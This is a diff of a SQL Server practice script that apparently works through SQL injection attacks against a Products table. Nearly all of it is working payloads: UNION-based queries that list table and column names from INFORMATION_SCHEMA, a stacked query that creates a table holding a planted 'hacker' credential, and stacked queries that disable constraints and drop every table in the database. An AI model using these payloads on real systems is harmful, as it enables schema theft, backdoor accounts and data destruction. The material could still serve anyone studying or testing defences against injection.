@@ -15,16 +15,14 @@ GO
 -- Get table name
 SELECT TOP(1) Id, Name, CategoryId, Image, Price, PromotionPrice, OriginalPrice, Description, Content, HomeFlag, HotFlag, ViewCount, Tags, Unit, SeoPageTitle, SeoAlias, SeoKeywords, SeoDescription, DateCreated, DateModified, Status 
 FROM dbo.Products WHERE Name = 'product 1445435'
-UNION ALL SELECT 1, TABLE_NAME, 3, '4', 5, 6, 7, '8', '9', 10, 11, 12, '13', '14', '15', '16', '17', '18', '19', '20', 21 FROM INFORMATION_SCHEMA.TABLES --
+UNION ALL SELECT 1, TABLE_NAME, 3, '4', 5, 6, 7, '8', '9', 10, 11, 12, '13', '14', '15', '16', '17', '18', '19', '20', 21 FROM INFORMATION_SCHEMA.TABLES ORDER BY 2 OFFSET 50 ROWS FETCH NEXT 1 ROW ONLY --
 GO
-
-
 
 
 -- Get columns name and data type
 SELECT TOP(1) Id, Name, CategoryId, Image, Price, PromotionPrice, OriginalPrice, Description, Content, HomeFlag, HotFlag, ViewCount, Tags, Unit, SeoPageTitle, SeoAlias, SeoKeywords, SeoDescription, DateCreated, DateModified, Status 
-FROM dbo.Products WHERE Name = 'product 1445435' union all 
-SELECT 1, CONCAT(COLUMN_NAME, ' - ', DATA_TYPE), 3, '4', 5, 6, 7, '8', '9', 10, 11, 12, '13', '14', '15', '16', '17', '18', '19', '20', 21 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Products'
+FROM dbo.Products WHERE Name = 'product 1445435' 
+UNION ALL SELECT 1, CONCAT(COLUMN_NAME, ' - ', DATA_TYPE), 3, '4', 5, 6, 7, '8', '9', 10, 11, 12, '13', '14', '15', '16', '17', '18', '19', '20', 21 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Functions' ORDER BY 2 OFFSET 5 ROWS FETCH NEXT 1 ROW ONLY --
 GO
 
 -- Insert new product
@@ -34,9 +32,12 @@ INSERT dbo.Products (Name, CategoryId, Image, Price, PromotionPrice, OriginalPri
 VALUES('hack', 1, 'hack', 0, 0, 0, 'hack', 'hack', 0, 0, 0, 'hack', 'hack', 'hack', 'hack', 'hack', 'hack', 'hack', 'hack', 0)
 GO
 
+SELECT * FROM dbo.Products WHERE Name = 'hack'
+
+DELETE dbo.Products WHERE Name = 'hack'
 
 -- Inject query to modify database
-SELECT * FROM dbo.Products WHERE Id = 1;CREATE TABLE HackTable(Id INT PRIMARY KEY, UserName VARCHAR(MAX), UserPassword VARCHAR(MAX));INSERT INTO HackTable(Id, UserName, UserPassword)VALUES(1, 'hacker', 'hacker');
+SELECT * FROM dbo.Products WHERE Name = 'product 1';CREATE TABLE HackTable(Id INT PRIMARY KEY, UserName VARCHAR(MAX), UserPassword VARCHAR(MAX));INSERT INTO HackTable(Id, UserName, UserPassword)VALUES(1, 'hacker', 'hacker');
 GO
 
 SELECT * FROM dbo.HackTable
@@ -46,11 +47,10 @@ SELECT * FROM dbo.Products WHERE Id = 1; DROP TABLE HackTable;
 GO
 
 -- Inject query to drop all table 
-CREATE PROCEDURE DROPALLTABLE @sql NVARCHAR(max)= '' AS BEGIN SELECT @sql += ' Drop table ' + QUOTENAME(s.NAME) + '.' + QUOTENAME(t.NAME) + '; ' FROM sys.tables t JOIN sys.schemas s ON t.[schema_id] = s.[schema_id] WHERE  t.type = 'U' PRINT @sql Exec sp_executesql @sql END; -- 
-SELECT * FROM dbo.HackTable; EXEC DROPALLTABLE 'EXEC sp_msforeachtable "ALTER TABLE ? NOCHECK CONSTRAINT all";';--
+SELECT * FROM dbo.Products WHERE Name = 'product 1'; EXEC sp_msforeachtable 'ALTER TABLE ? NOCHECK CONSTRAINT all'; EXEC sp_msforeachtable 'DROP TABLE ?'
+-- SELECT * FROM dbo.Products WHERE Name = 'product 1'; CREATE PROCEDURE DROPALLTABLE @sql NVARCHAR(max)= '' AS BEGIN SELECT @sql += ' Drop table ' + QUOTENAME(s.NAME) + '.' + QUOTENAME(t.NAME) + '; ' FROM sys.tables t JOIN sys.schemas s ON t.[schema_id] = s.[schema_id] WHERE  t.type = 'U' PRINT @sql Exec sp_executesql @sql END; -- 
+-- SELECT * FROM dbo.HackTable; EXEC DROPALLTABLE 'EXEC sp_msforeachtable "ALTER TABLE ? NOCHECK CONSTRAINT all";';--
 GO
-
-
 
 
 -- Create store procedure to get product by name
